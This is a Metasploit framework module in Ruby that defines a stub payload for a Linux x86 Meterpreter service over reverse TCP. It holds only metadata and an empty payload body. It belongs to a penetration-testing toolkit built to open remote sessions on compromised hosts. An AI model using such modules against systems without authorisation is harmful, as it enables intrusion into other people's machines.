##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 0

  include Msf::Payload::Linux::X86::Prepends
  include Msf::Payload::Single
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Meterpreter Service, Reverse TCP Inline',
        'Description' => 'Stub payload for interacting with a Meterpreter Service',
        'Author' => 'hdm',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X86,
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::Meterpreter_x86_Linux,
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end
end
